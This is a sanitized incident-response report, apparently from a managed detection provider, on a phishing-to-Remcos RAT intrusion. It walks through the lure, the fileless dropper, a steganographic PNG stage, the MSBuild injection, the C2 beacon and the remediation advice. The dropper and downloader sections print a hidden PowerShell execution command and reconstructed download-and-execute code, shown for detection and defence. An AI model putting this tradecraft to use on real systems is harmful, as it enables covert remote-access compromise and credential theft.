Fileless Malware Intrusion — From a Phishing Lure to a Remcos RAT

Reconstructing a seven-minute intrusion: a trusted-app phishing link, a fileless PowerShell dropper, a payload hidden inside a PNG, and a Remcos remote-access trojan calling home.

This is a sanitized account of a real Managed Detection and Response (MDR) investigation. Account names and hostnames are placeholders; network indicators are replaced with RFC 2606 (example) domains and RFC 5737 (documentation) IP ranges, and file hashes are withheld. The malware behavior, tooling, and analysis are real and unchanged.

Executive Summary

On 4 June 2026, the MDR team alerted the client to a suspicious process on a user's workstation making an outbound connection to an external IP address. Incident response was initiated to determine the scope and impact of the activity. The investigation confirmed that a single user account on a single host was in scope; no lateral movement or additional affected systems were identified.

The root cause was a social-engineering lure. The user opened a link from within a trusted business application — a cloud case-management (CRM) platform — that downloaded a malicious JavaScript file disguised as a request-for-quotation (RFQ) document. Running that file launched a fileless infection chain: a hidden PowerShell dropper decoded a payload held entirely in memory, retrieved a second stage concealed inside a PNG image using steganography, and ultimately loaded Remcos 7.2.5 Pro — a commercial remote-access tool routinely abused for full remote control, credential theft, and surveillance. Almost nothing was written to disk, and the endpoint anti-virus raised no alert; it was network telemetry that exposed the command-and-control (C2) channel. Once the user ran the file, a live C2 connection was established in a matter of seconds.

Investigation & Analysis

Initial access

The client reported that the user had opened a support case in a cloud case-management platform and clicked an embedded link. Rather than arriving by email — where it would have been subject to gateway and attachment controls — the lure reached the user inside a trusted, authenticated business application, which is a large part of why it was clicked. DNS telemetry confirmed that at 13:04:39 UTC the host resolved and connected to the attacker-controlled URL hxxps://rfq-download[.]example/Request-for-Quotation.js, downloading a JavaScript file named to impersonate a request-for-quotation document — a common lure in business-email-compromise and malware-delivery campaigns.

The file landed at D:\Users\jdoe\Downloads\Request-for-Quotation.js. (The user profile residing on the D: volume is consistent with a cloud-hosted virtual desktop image.) A copy of the file was retrieved from the hosting URL in a controlled sandbox for analysis.

The dropper: Request-for-Quotation.js

Analysis showed that Request-for-Quotation.js is a fileless dropper. On execution it uses Windows Management Instrumentation (WMI) to launch a hidden PowerShell process, masking the activity as routine system-service behavior:

powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command [ScriptBlock]::Create(${env:INTERNAL_DB_CACHE})

Figure 1 — Hidden PowerShell command launched by the dropper on WKSTN-01.

The dropper decodes its true payload using layered ROT13 and hex-to-ASCII transformations and writes the result into a user environment variable named INTERNAL_DB_CACHE — a deliberately mundane, database-sounding name chosen to blend into the environment. The PowerShell command above then reads that variable back and executes it directly in memory with [ScriptBlock]::Create(), so the malicious logic never lands on disk as a script file.

Fileless execution and payload staging

Sysmon network-connection logs showed the hidden PowerShell process connecting to the hosting infrastructure at 13:11:33, followed at 13:11:35 by execution of the INTERNAL_DB_CACHE payload — a heavily obfuscated PowerShell downloader. Two techniques stood out during analysis: variable and string names are randomized to defeat signatures, and the second-stage URL is split and reassembled at runtime to evade static extraction. In the example below, every s has been replaced with a # in the stored string and restored at runtime with a .Replace('#','s') call:

$url = 'http#://[redacted].worker#.dev/[redacted]'.Replace('#','s')
$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0')
$data = $wc.DownloadData($url) # retrieves 6363.png
# ...remaining payload obfuscated / truncated...

Figure 2 — Reconstructed logic from the INTERNAL_DB_CACHE payload (variable names normalized, indicators sanitized). The real payload was several kilobytes of randomized, base64-like text.

The downloader spoofs a browser User-Agent and pulls a file called 6363.png from a subdomain on Cloudflare's workers.dev platform. The specific subdomain incorporated the name of an unrelated developer account that had been abused to host the payload; that account name is redacted here.

Secondary payload: steganography in a PNG

The acquired 6363.png masquerades as a harmless image but uses steganography to conceal an obfuscated, Base64-encoded .NET DLL. That DLL is a trojanised build of Microsoft.Win32.TaskScheduler — a legitimate open-source .NET library for managing Windows scheduled tasks — repurposed to act as an in-memory loader. Because it executes directly in memory, no corresponding file-write was observed on the local disk.

Once initialised, the loader reaches out to a second hosting location — a Cloudflare R2 bucket at hxxps://[redacted].r2[.]dev/6363.png — to retrieve, inject, and execute the final payload.

Final payload: Remcos 7.2.5 Pro

The final payload is Remcos 7.2.5 Pro, a commercial remote-administration tool heavily abused by threat actors for surveillance, data theft, and full remote control of infected systems. Consistent with the fileless design, no Remcos binary or on-disk execution artifact was found; its presence was confirmed by network telemetry — an outbound connection from MSBuild.exe (a trusted Microsoft build utility abused here as a living-off-the-land injection host) to the C2 server at 203.0.113.91 on port 2026. That successful beacon confirmed the injection and command-and-control sequence had completed.

Anti-virus and third-party security logs were reviewed for any related detection or remediation events; none were found. No further suspicious activity was observed on the host after the C2 connection was established.

Findings & Root Cause

  • Root cause — social engineering through a trusted channel. The intrusion began with a user clicking a malicious link delivered inside an authenticated business application, bypassing the email-security controls that would normally inspect such a lure.
  • User execution was required. The .js dropper only ran because the user opened it; on Windows, .js files execute through wscript.exe by default — a long-standing delivery weakness.
  • Fileless, in-memory tradecraft defeated disk-based detection. The payload lived in an environment variable and executed via [ScriptBlock]::Create(); the loader and RAT ran in memory. The endpoint anti-virus produced no alert.
  • Living-off-the-land binaries (LOLBins). The chain abused wscript.exe, powershell.exe, WMI, and MSBuild.exe — all legitimate, signed Windows components — to blend malicious activity into normal system behavior.
  • Detection came from the network. With almost no disk footprint, it was the outbound C2 beacon on a non-standard port that surfaced the compromise — underscoring the value of network and behavioral telemetry alongside endpoint AV.
  • Scope. A single user and a single host were affected; no lateral movement, additional hosts, or data exfiltration beyond the C2 channel were identified.

Containment & Remediation

The following actions were recommended to contain the incident and restore the affected account and host to a trusted state:

  • Rebuild the affected host from a known-good image. Because the malware ran in memory and abused trusted system binaries, manual clean-up or an AV scan cannot be relied on to fully restore integrity; re-imaging from a trusted baseline is the safe option.
  • Reset credentials for the affected account. All passwords used by the account should be changed promptly — including any stored in credential managers — on the assumption they may have been captured. Users should choose genuinely new passwords rather than incrementing a single character (e.g. Example1! → Example2!), in line with NIST memorized-secret guidance, and multi-factor authentication should be enforced.
  • Block the malicious domains and IP addresses at all appropriate network controls — firewalls, web proxies, and DNS — including the lure host, the payload-hosting subdomains, and the C2 address and port.
  • Hunt for the indicators in the appendix across the estate to confirm the activity was isolated to the single host.

Response and blocking actions of this kind can be executed directly from the MDR platform's automation and response tooling.

Corrective actions

  • User-awareness training. Deliver phishing-awareness training — stressing that malicious links can arrive through trusted business applications, not only email — and give users a simple way to report suspicious links or messages to security for analysis. Repeat at regular intervals.
  • Restrict script execution. Consider changing the default handler for .js/.vbs files so they open in a text editor rather than executing, and constrain PowerShell (Constrained Language Mode, script-block logging, and execution policy) where operationally feasible.
  • Egress filtering. Restrict and monitor outbound traffic — particularly connections to non-standard ports and to newly-registered or low-reputation domains and developer-platform subdomains (workers.dev, r2.dev and similar).

Lessons Learned

  • Trusted channels are a blind spot. Email security did nothing here because the lure never touched email. Awareness training and detection logic have to account for links arriving through SaaS and business applications.
  • Endpoint AV alone is not enough against fileless malware. Nothing meaningful was written to disk and AV stayed silent; the compromise was caught by network and behavioral telemetry. Defense in depth — EDR behavioral detection plus network monitoring — is what closed the gap.
  • Watch the LOLBins. wscript.exe spawning powershell.exe via WMI, and MSBuild.exe making outbound connections, are high-signal behaviors worth alerting on regardless of the AV verdict.
  • Speed matters. The automated chain went from execution to an established C2 channel in seconds. The window to disrupt an intrusion like this is short — which is exactly the case for fast, telemetry-driven detection and response.
